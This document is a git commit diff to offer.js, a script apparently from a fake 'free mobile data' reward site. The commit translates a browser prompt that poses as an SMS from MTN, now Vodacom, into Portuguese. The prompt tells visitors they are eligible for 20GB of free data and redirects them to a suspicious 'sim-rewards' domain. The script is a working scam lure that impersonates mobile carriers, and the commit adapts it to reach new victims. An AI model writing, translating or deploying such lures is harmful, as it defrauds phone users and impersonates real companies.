5eefac825828b593b66153785d4bde36a3604454
decullian <decullianresort@gmail.com>
2024-08-29 23:57:11 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '20GB Free Data'
-password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data MTN OLD SIM REWARD, Kindly Press OK to ACTIVATE ','20GB Free Data');
-if (password != '20GB Free Data') {
+var password = '20GB de dados grátis'
+password=prompt('SMS: Parabéns, seu número é elegível para receber 20GB de dados grátis RECOMPENSA DE SIM ANTIGO VODACOM, pressione OK para ATIVAR ','20GB de dados grátis');
+if (password != '20GB de dados grátis') {
 location.href='https://sim-rewards.data-offer.xyz/15GB';
 }
